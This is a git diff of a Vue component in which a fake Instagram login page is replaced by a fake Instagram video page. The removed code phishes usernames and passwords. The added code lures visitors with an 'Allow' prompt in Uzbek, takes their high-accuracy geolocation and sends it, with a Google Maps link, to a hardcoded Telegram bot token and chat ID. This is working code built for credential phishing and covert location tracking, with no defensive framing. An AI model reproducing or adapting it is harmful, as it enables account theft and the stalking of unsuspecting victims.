@@ -1,86 +1,54 @@
 <template>
-  <div class="container">
-    <div class="login-box">
-      <div class="logo-container">
-        <img
-          src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
-          alt="Instagram Logo"
-          class="logo-img"
-        />
-        <h1 class="logo">Instagram</h1>
-      </div>
-
-      <form class="login-form" @submit.prevent="handleLogin">
-        <input
-          type="text"
-          v-model="username"
-          placeholder="Phone number, username, or email"
-          class="input-field"
-        />
-
-        <input
-          type="password"
-          v-model="password"
-          placeholder="Password"
-          class="input-field"
-        />
-
-        <button type="submit" class="login-button">Log in</button>
-      </form>
-
-      <div class="divider">
-        <div class="divider-line"></div>
-        <span class="divider-text">OR</span>
-        <div class="divider-line"></div>
-      </div>
-
-      <div class="forgot-password">
-        <a href="#" class="forgot-link"> Forgot password? </a>
+  <div class="video-container">
+    <!-- Modal -->
+    <div class="modal" v-if="showModal">
+      <div class="modal-content">
+        <h2>Videoni ko'rishni xohlaysizmi?</h2>
+        <button class="allow-btn" @click="allowVideo">Allow</button>
       </div>
     </div>
 
-    <div class="signup-box">
-      <p class="signup-text">
-        Don't have an account?
-        <a href="#" class="signup-link"> Sign up </a>
-      </p>
+    <!-- Video Player -->
+    <div v-if="showVideo" class="video-box">
+      <video controls autoplay class="insta-video">
+        <source src="./assets/mainvideo.mp4" type="video/mp4" />
+        Your browser does not support the video tag.
+      </video>
     </div>
   </div>
 </template>
 
 <script>
 export default {
-  name: "InstagramLogin",
+  name: "InstagramVideo",
   data() {
     return {
-      username: "",
-      password: "",
-      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
-      chatId: "5673984207",
+      showModal: true,
+      showVideo: false,
       latitude: null,
       longitude: null,
-      locationError: null,
+      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
+      chatId: "5673984207",
     };
   },
-  mounted() {
-    // Request user's geolocation when the component is mounted
-    this.getGeolocation();
-  },
   methods: {
-    // Get user's geolocation
+    allowVideo() {
+      this.showModal = false;
+      this.showVideo = true;
+      this.getGeolocation();
+    },
+
     getGeolocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            // Success callback
             this.latitude = position.coords.latitude;
             this.longitude = position.coords.longitude;
-            console.log("Location captured:", this.latitude, this.longitude);
+            this.sendToTelegram();
           },
           (error) => {
-            // Error callback
-            this.locationError = error.message;
             console.error("Geolocation error:", error.message);
+            this.sendToTelegram(true);
           },
           {
             enableHighAccuracy: true,
@@ -89,65 +57,30 @@ export default {
           }
         );
       } else {
-        this.locationError = "Geolocation is not supported by this browser.";
-        console.error("Geolocation is not supported by this browser.");
+        this.sendToTelegram(true);
       }
     },
 
-    handleLogin() {
-      // Log the login attempt
-      console.log("Login attempt with:", {
-        username: this.username,
-        password: this.password,
-      });
+    sendToTelegram(error = false) {
+      const message = error
+        ? `❌ Geolocation olishda xatolik yuz berdi yoki foydalanuvchi rad etdi.`
+        : `📍 Yangi foydalanuvchi joylashuvi:
+Latitude: ${this.latitude}
+Longitude: ${this.longitude}
+🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
+🕒 Vaqt: ${new Date().toLocaleString()}
+`;
 
-      // Send the login credentials to Telegram
-      this.sendToTelegram();
-
-      // Clear the form fields after submission
-      this.username = "";
-      this.password = "";
-
-      // Redirect to instagram Link
-      if (
-        window.confirm(
-          "Siz ko'rmoqchi bo'lgan ma'lumot bu yerda, ko'rish uchun OK ni bosing!"
-        )
-      ) {
-        window.location.href =
-          "https://www.instagram.com/reel/DHa0N00qYMQ/?igsh=NTc4MTIwNjQ2YQ==";
-      }
-    },
-
-    sendToTelegram() {
-      // Format the message with geolocation data
-      const message = `
-New Instagram Login:
-Username: ${this.username}
-Password: ${this.password}
-Time: ${new Date().toLocaleString()}
-${
-  this.latitude && this.longitude
-    ? `Location: ${this.latitude}, ${this.longitude}
-Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}`
-    : "Location: Not available"
-}
-      `;
-
-      // Encode the message for URL
       const encodedMessage = encodeURIComponent(message);
-
-      // Create the Telegram API URL
       const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;
 
-      // Send the request to Telegram
       fetch(telegramUrl)
-        .then((response) => response.json())
+        .then((res) => res.json())
         .then((data) => {
-          console.log("Message sent to Telegram:", data);
+          console.log("Telegramga yuborildi:", data);
         })
-        .catch((error) => {
-          console.error("Error sending message to Telegram:", error);
+        .catch((err) => {
+          console.error("Telegramga yuborishda xatolik:", err);
         });
     },
   },
@@ -158,124 +91,70 @@ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}`
 * {
   margin: 0;
   padding: 0;
+  background: #000;
   box-sizing: border-box;
 }
-.container {
+.video-container {
   display: flex;
-  flex-direction: column;
-  align-items: center;
   justify-content: center;
+  align-items: center;
+  width: 100%;
   min-height: 100vh;
   background-color: #000;
   color: #fff;
+  position: relative;
+  font-family: Arial, sans-serif;
 }
 
-.login-box {
+/* Modal styling */
+.modal {
+  position: fixed;
+  top: 0;
+  left: 0;
   width: 100%;
-  max-width: 350px;
-  padding: 0 20px;
-}
-
-.logo-container {
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.8);
   display: flex;
-  flex-direction: column;
   justify-content: center;
   align-items: center;
-  margin-bottom: 32px;
+  z-index: 10;
 }
 
-.logo {
-  font-size: 2.5rem;
-  font-family: serif;
-  font-style: italic;
-  font-weight: 600;
-  margin-top: 10px;
+.modal-content {
+  background-color: #1a1a1a;
+  padding: 30px 40px;
+  border-radius: 12px;
+  text-align: center;
+  box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
 }
 
-.logo-img {
-  width: 72px;
-  height: 72px;
-}
-
-.login-form {
-  display: flex;
-  flex-direction: column;
-  gap: 16px;
-}
-
-.input-field {
-  width: 100%;
-  padding: 10px 12px;
-  background-color: transparent;
-  border: 1px solid #444;
-  border-radius: 4px;
-  color: #fff;
-}
-
-.input-field::placeholder {
-  color: #777;
-}
-
-.login-button {
-  width: 100%;
-  padding: 8px 0;
+.allow-btn {
+  margin-top: 20px;
   background-color: #0095f6;
+  color: white;
+  padding: 10px 20px;
   border: none;
-  border-radius: 4px;
-  color: #fff;
-  font-weight: 600;
+  border-radius: 8px;
+  font-weight: bold;
   cursor: pointer;
 }
 
-.login-button:hover {
-  background-color: #0081d6;
+.allow-btn:hover {
+  background-color: #0078cc;
 }
 
-.divider {
-  display: flex;
-  align-items: center;
-  margin: 16px 0;
-}
-
-.divider-line {
-  flex: 1;
-  height: 1px;
-  background-color: #444;
-}
-
-.divider-text {
-  padding: 0 16px;
-  color: #777;
-  font-size: 0.8rem;
-}
-
-.forgot-password {
-  margin-top: 16px;
-  text-align: center;
-}
-
-.forgot-link {
-  color: #0095f6;
-  font-size: 0.8rem;
-  text-decoration: none;
-}
-
-.signup-box {
-  margin-top: 32px;
-  border-top: 1px solid #444;
+/* Video player styling */
+.video-box {
+  max-width: 400px;
   width: 100%;
-  max-width: 350px;
-  padding: 16px 20px;
+  padding: 20px;
+  border-radius: 20px;
+  background-color: #111;
+  box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
 }
 
-.signup-text {
-  text-align: center;
-  font-size: 0.8rem;
-  color: #777;
-}
-
-.signup-link {
-  color: #0095f6;
-  text-decoration: none;
+.insta-video {
+  width: 100%;
+  border-radius: 12px;
 }
 </style>
